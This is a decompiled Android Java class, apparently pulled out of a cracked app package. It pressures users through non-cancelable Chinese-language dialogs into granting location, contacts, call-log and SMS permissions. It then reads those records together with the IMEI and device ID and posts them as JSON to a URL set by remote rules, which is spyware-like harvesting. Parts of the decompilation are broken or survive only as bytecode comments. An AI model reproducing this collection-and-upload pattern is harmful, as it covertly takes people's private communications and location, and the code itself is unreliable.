package com.xy.whf.a;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import com.xy.whf.base.RootActivity;
import com.xy.whf.entity.RuleInfo;
import com.xy.whf.helper.PermissionHelper;
import com.xy.whf.helper.a;
import com.xy.whf.http.HttpRequest;
import com.xy.whf.widget.DefaultAlertDialog;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class c {
  @SuppressLint({"StaticFieldLeak"})
  private static c a;
  
  private DefaultAlertDialog b;
  
  private DefaultAlertDialog c;
  
  private d d;
  
  private Context e;
  
  private c(Context paramContext) {
    this.e = paramContext;
  }
  
  public static c a(Context paramContext) {
    // Byte code:
    //   0: ldc com/xy/whf/a/c
    //   2: monitorenter
    //   3: getstatic com/xy/whf/a/c.a : Lcom/xy/whf/a/c;
    //   6: ifnonnull -> 22
    //   9: new com/xy/whf/a/c
    //   12: astore_1
    //   13: aload_1
    //   14: aload_0
    //   15: invokespecial <init> : (Landroid/content/Context;)V
    //   18: aload_1
    //   19: putstatic com/xy/whf/a/c.a : Lcom/xy/whf/a/c;
    //   22: getstatic com/xy/whf/a/c.a : Lcom/xy/whf/a/c;
    //   25: astore_0
    //   26: ldc com/xy/whf/a/c
    //   28: monitorexit
    //   29: aload_0
    //   30: areturn
    //   31: astore_0
    //   32: ldc com/xy/whf/a/c
    //   34: monitorexit
    //   35: aload_0
    //   36: athrow
    // Exception table:
    //   from	to	target	type
    //   3	22	31	finally
    //   22	26	31	finally
  }
  
  private void a(int paramInt1, String paramString, int paramInt2) {
    (new Handler(Looper.getMainLooper())).post(new Runnable(this, paramInt1, paramString, paramInt2) {
          public void run() {
            DefaultAlertDialog.MessageDialogBuilder messageDialogBuilder = (new DefaultAlertDialog.MessageDialogBuilder(c.a(this.d))).addPositiveAction("前往设置", new DefaultAlertDialog.ActionListener(this) {
                  public void onClick(View param2View, DefaultAlertDialog param2DefaultAlertDialog) {
                    Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent.setData(Uri.parse("package:" + a.c(c.a(this.a.d))));
                    ((RootActivity)c.a(this.a.d)).startActivityForResult(intent, this.a.a);
                  }
                }).setMessage(this.b).setCancelable(false);
            if (this.c == 3)
              messageDialogBuilder.addNegativeAction("取消", new DefaultAlertDialog.ActionListener(this) {
                    public void onClick(View param2View, DefaultAlertDialog param2DefaultAlertDialog) {
                      c.a(this.a.d, param2DefaultAlertDialog);
                      c.a(this.a.d, (JSONObject)null);
                    }
                  }); 
            c.b(this.d, messageDialogBuilder.create());
          }
        });
  }
  
  private void a(RuleInfo paramRuleInfo) {
    if (this.c == null) {
      DefaultAlertDialog.MessageDialogBuilder messageDialogBuilder = (new DefaultAlertDialog.MessageDialogBuilder(this.e)).addPositiveAction("打开GPS", new DefaultAlertDialog.ActionListener(this, paramRuleInfo) {
            public void onClick(View param1View, DefaultAlertDialog param1DefaultAlertDialog) {
              c.a(this.b, this.a);
            }
          }).setMessage("系统检测到未开启GPS定位服务,前往设置页面开启").setCancelable(false);
      if (paramRuleInfo.uploadType == 3)
        messageDialogBuilder.addNegativeAction("取消", new DefaultAlertDialog.ActionListener(this) {
              public void onClick(View param1View, DefaultAlertDialog param1DefaultAlertDialog) {
                c.a(this.a, param1DefaultAlertDialog);
              }
            }); 
      this.c = messageDialogBuilder.create();
    } 
  }
  
  private void a(DefaultAlertDialog paramDefaultAlertDialog) {
    (new Handler(Looper.getMainLooper())).post(new Runnable(this, paramDefaultAlertDialog) {
          public void run() {
            if (this.a.isShowing())
              this.a.dismiss(); 
            c.a(this.b, (JSONObject)null);
          }
        });
  }
  
  private void a(JSONObject paramJSONObject) {
    if (this.d != null)
      (new Handler(Looper.getMainLooper())).post(new Runnable(this, paramJSONObject) {
            public void run() {
              c.d(this.b).a(this.a);
            }
          }); 
  }
  
  private void a(JSONObject paramJSONObject1, JSONObject paramJSONObject2) {
    if (paramJSONObject2 != null) {
      Iterator<String> iterator = paramJSONObject2.keys();
      while (iterator.hasNext()) {
        String str = iterator.next();
        try {
          paramJSONObject1.put(str, paramJSONObject2.get(str));
        } catch (JSONException jSONException) {
          jSONException.printStackTrace();
        } 
      } 
    } 
  }
  
  private void b(RuleInfo paramRuleInfo) {
    a(paramRuleInfo);
    String str = a.d(this.e);
    a(60003, "请在设置-应用-" + str + "-权限中开启位置信息权限，以正常使用" + str + "相关功能", paramRuleInfo.uploadType);
    if (PermissionHelper.a(this.e, "android.permission.ACCESS_FINE_LOCATION")) {
      if (!PermissionHelper.a(this.e)) {
        this.c.show();
        return;
      } 
      g.a(this.e).a(g(paramRuleInfo));
      return;
    } 
    PermissionHelper.a((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramRuleInfo) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (param1Int2 == 0) {
              c.a(this.b, c.b(this.b));
              if (!PermissionHelper.a(c.a(this.b))) {
                c.c(this.b).show();
                return;
              } 
              g.a(c.a(this.b)).a(c.b(this.b, this.a));
              return;
            } 
            c.c(this.b, c.b(this.b));
          }
        });
  }
  
  private void b(DefaultAlertDialog paramDefaultAlertDialog) {
    (new Handler(Looper.getMainLooper())).post(new Runnable(this, paramDefaultAlertDialog) {
          public void run() {
            if (!this.a.isShowing())
              this.a.show(); 
            c.a(this.b, (JSONObject)null);
          }
        });
  }
  
  private void c(RuleInfo paramRuleInfo) {
    if (PermissionHelper.a(this.e)) {
      g.a(this.e).a(g(paramRuleInfo));
      return;
    } 
    PermissionHelper.e((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramRuleInfo) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (param1Int2 == 0) {
              c.a(this.b, c.b(this.b));
              g.a(c.a(this.b)).a(c.b(this.b, this.a));
              return;
            } 
            if (this.a.uploadType == 3)
              c.a(this.b, c.b(this.b)); 
          }
        });
  }
  
  private void d(RuleInfo paramRuleInfo) {
    String str = a.d(this.e);
    a(60004, "请在设置-应用-" + str + "-权限中开启通讯录/联系人权限，以正常使用" + str + "相关功能", paramRuleInfo.uploadType);
    if (PermissionHelper.a(this.e, "android.permission.READ_CONTACTS")) {
      f.a(this.e).a(paramRuleInfo.number, g(paramRuleInfo));
      return;
    } 
    PermissionHelper.b((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramRuleInfo) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (param1Int2 == 0) {
              c.a(this.b, c.b(this.b));
              f.a(c.a(this.b)).a(this.a.number, c.b(this.b, this.a));
              return;
            } 
            c.c(this.b, c.b(this.b));
          }
        });
  }
  
  private void e(RuleInfo paramRuleInfo) {
    String str = a.d(this.e);
    a(60005, "请在设置-应用-" + str + "-权限中开启通话记录权限，以正常使用" + str + "相关功能", paramRuleInfo.uploadType);
    if (PermissionHelper.a(this.e, "android.permission.READ_CALL_LOG")) {
      e.a(this.e).a(paramRuleInfo.startTime, paramRuleInfo.number, g(paramRuleInfo));
      return;
    } 
    PermissionHelper.c((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramRuleInfo) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (param1Int2 == 0) {
              c.a(this.b, c.b(this.b));
              e.a(c.a(this.b)).a(this.a.startTime, this.a.number, c.b(this.b, this.a));
              return;
            } 
            c.c(this.b, c.b(this.b));
          }
        });
  }
  
  private void f(RuleInfo paramRuleInfo) {
    String str = a.d(this.e);
    a(60006, "请在设置-应用-" + str + "-权限中开启短信记录权限，以正常使用" + str + "相关功能", paramRuleInfo.uploadType);
    if (PermissionHelper.b(this.e)) {
      h.a(this.e).a(paramRuleInfo.startTime, paramRuleInfo.number, g(paramRuleInfo));
      return;
    } 
    PermissionHelper.d((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramRuleInfo) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (PermissionHelper.b(c.a(this.b))) {
              c.a(this.b, c.b(this.b));
              h.a(c.a(this.b)).a(this.a.startTime, this.a.number, c.b(this.b, this.a));
              return;
            } 
            c.c(this.b, c.b(this.b));
          }
        });
  }
  
  private b g(RuleInfo paramRuleInfo) {
    return new b(this, paramRuleInfo) {
        public void a(Object param1Object, int param1Int) {
          if (param1Int == 0 && param1Object != null) {
            try {
              JSONObject jSONObject = new JSONObject();
              this();
              jSONObject.put("data_type", this.a.dataType);
              jSONObject.put("data_pos", this.a.dataPos);
              if (param1Object instanceof JSONObject) {
                jSONObject.put("data_obj", param1Object);
              } else {
                jSONObject.put("data_rows", param1Object);
              } 
              c.a(this.b, jSONObject);
              HttpRequest.getInstance(c.a(this.b)).post(this.a.url, jSONObject, null);
            } catch (Exception exception) {
              exception.printStackTrace();
            } 
            return;
          } 
          c.a(this.b, (JSONObject)null);
        }
      };
  }
  
  public JSONArray a(List<RuleInfo> paramList) {
    // Byte code:
    //   0: new org/json/JSONArray
    //   3: dup
    //   4: invokespecial <init> : ()V
    //   7: astore_2
    //   8: aload_1
    //   9: invokeinterface iterator : ()Ljava/util/Iterator;
    //   14: astore_3
    //   15: aload_3
    //   16: invokeinterface hasNext : ()Z
    //   21: ifeq -> 298
    //   24: aload_3
    //   25: invokeinterface next : ()Ljava/lang/Object;
    //   30: checkcast com/xy/whf/entity/RuleInfo
    //   33: astore #4
    //   35: new org/json/JSONObject
    //   38: astore_1
    //   39: aload_1
    //   40: invokespecial <init> : ()V
    //   43: aload_1
    //   44: ldc_w 'data_type'
    //   47: aload #4
    //   49: getfield dataType : I
    //   52: invokevirtual put : (Ljava/lang/String;I)Lorg/json/JSONObject;
    //   55: pop
    //   56: aload_1
    //   57: ldc_w 'data_pos'
    //   60: aload #4
    //   62: getfield dataPos : I
    //   65: invokevirtual put : (Ljava/lang/String;I)Lorg/json/JSONObject;
    //   68: pop
    //   69: aload_1
    //   70: ldc_w 'zmid'
    //   73: aload_0
    //   74: getfield e : Landroid/content/Context;
    //   77: invokestatic g : (Landroid/content/Context;)Ljava/lang/String;
    //   80: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   83: pop
    //   84: aload_1
    //   85: ldc_w 'device_id'
    //   88: aload_0
    //   89: getfield e : Landroid/content/Context;
    //   92: invokestatic d : (Landroid/content/Context;)Ljava/lang/String;
    //   95: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   98: pop
    //   99: aload_1
    //   100: ldc_w 'imei'
    //   103: aload_0
    //   104: getfield e : Landroid/content/Context;
    //   107: invokestatic b : (Landroid/content/Context;)Ljava/lang/String;
    //   110: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   113: pop
    //   114: aload #4
    //   116: getfield dataType : I
    //   119: tableswitch default -> 148, 1 -> 226, 2 -> 244, 3 -> 262, 4 -> 280
    //   148: new org/json/JSONObject
    //   151: astore_1
    //   152: aload_1
    //   153: invokespecial <init> : ()V
    //   156: aload_0
    //   157: aload_1
    //   158: aload_0
    //   159: getfield e : Landroid/content/Context;
    //   162: aload #4
    //   164: getfield keys : Ljava/util/List;
    //   167: invokestatic a : (Landroid/content/Context;Ljava/util/List;)Lorg/json/JSONObject;
    //   170: invokespecial a : (Lorg/json/JSONObject;Lorg/json/JSONObject;)V
    //   173: aload #4
    //   175: getfield uploadType : I
    //   178: ifeq -> 209
    //   181: aload #4
    //   183: getfield url : Ljava/lang/String;
    //   186: invokestatic isNullOrEmpty : (Ljava/lang/Object;)Z
    //   189: ifne -> 209
    //   192: aload_0
    //   193: getfield e : Landroid/content/Context;
    //   196: invokestatic getInstance : (Landroid/content/Context;)Lcom/xy/whf/http/HttpRequest;
    //   199: aload #4
    //   201: getfield url : Ljava/lang/String;
    //   204: aload_1
    //   205: aconst_null
    //   206: invokevirtual post : (Ljava/lang/String;Lorg/json/JSONObject;Lcom/xy/whf/http/ResponseListener;)V
    //   209: aload_2
    //   210: aload_1
    //   211: invokevirtual put : (Ljava/lang/Object;)Lorg/json/JSONArray;
    //   214: pop
    //   215: goto -> 15
    //   218: astore_1
    //   219: aload_1
    //   220: invokevirtual printStackTrace : ()V
    //   223: goto -> 15
    //   226: aload_1
    //   227: ldc_w 'data_obj'
    //   230: aload_0
    //   231: getfield e : Landroid/content/Context;
    //   234: invokestatic a : (Landroid/content/Context;)Lorg/json/JSONObject;
    //   237: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   240: pop
    //   241: goto -> 156
    //   244: aload_1
    //   245: ldc_w 'data_obj'
    //   248: aload_0
    //   249: getfield e : Landroid/content/Context;
    //   252: invokestatic a : (Landroid/content/Context;)Lorg/json/JSONObject;
    //   255: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   258: pop
    //   259: goto -> 156
    //   262: aload_1
    //   263: ldc_w 'data_obj'
    //   266: aload_0
    //   267: getfield e : Landroid/content/Context;
    //   270: invokestatic a : (Landroid/content/Context;)Lorg/json/JSONObject;
    //   273: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   276: pop
    //   277: goto -> 156
    //   280: aload_1
    //   281: ldc_w 'data_rows'
    //   284: aload_0
    //   285: getfield e : Landroid/content/Context;
    //   288: invokestatic a : (Landroid/content/Context;)Lorg/json/JSONArray;
    //   291: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   294: pop
    //   295: goto -> 156
    //   298: aload_2
    //   299: areturn
    // Exception table:
    //   from	to	target	type
    //   35	148	218	java/lang/Exception
    //   148	156	218	java/lang/Exception
    //   156	209	218	java/lang/Exception
    //   209	215	218	java/lang/Exception
    //   226	241	218	java/lang/Exception
    //   244	259	218	java/lang/Exception
    //   262	277	218	java/lang/Exception
    //   280	295	218	java/lang/Exception
  }
  
  public void a(RuleInfo paramRuleInfo, d paramd) {
    this.d = paramd;
    paramRuleInfo.logData.dataType = paramRuleInfo.dataType;
    paramRuleInfo.logData.dataPos = paramRuleInfo.dataPos;
    switch (paramRuleInfo.dataType) {
      default:
        return;
      case 5:
        b(paramRuleInfo);
      case 6:
        d(paramRuleInfo);
      case 7:
        e(paramRuleInfo);
      case 8:
        break;
    } 
    f(paramRuleInfo);
  }
  
  public void a(List<RuleInfo> paramList, d paramd) {
    if (paramList.size() == 1) {
      a(paramList.get(0), paramd);
      return;
    } 
    b(paramList);
  }
  
  public void b(List<RuleInfo> paramList) {
    byte b = 0;
    String[] arrayOfString = new String[paramList.size()];
    int i = ((RuleInfo)paramList.get(0)).uploadType;
    while (b < paramList.size()) {
      switch (((RuleInfo)paramList.get(b)).dataType) {
        case 5:
          arrayOfString[b] = "android.permission.ACCESS_FINE_LOCATION";
          b++;
          break;
        case 6:
          arrayOfString[b] = "android.permission.READ_CONTACTS";
          b++;
          break;
        case 7:
          if (Build.VERSION.SDK_INT > 15)
            arrayOfString[b] = "android.permission.READ_CALL_LOG"; 
          b++;
          break;
        case 8:
          arrayOfString[b] = "android.permission.READ_SMS";
          b++;
          break;
      } 
    } 
    PermissionHelper.a((RootActivity)this.e, new PermissionHelper.PermissionCallBack(this, paramList, i) {
          public void result(int param1Int1, int param1Int2, String param1String) {
            if (param1Int1 == 0) {
              c.a(this.c, c.b(this.c));
              for (RuleInfo ruleInfo : this.a)
                this.c.a(ruleInfo, (d)null); 
            } else {
              if (this.b == 3) {
                c.a(this.c, c.b(this.c));
                return;
              } 
              c.b(this.c).show();
            } 
          }
        }arrayOfString);
  }
}


/* Location:              D:\Code\Crack\dex-tools-2.1-20190905-lanchon\zspns-pcgw-P36417A-0429-dex2jar.jar!\com\xy\whf\a\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */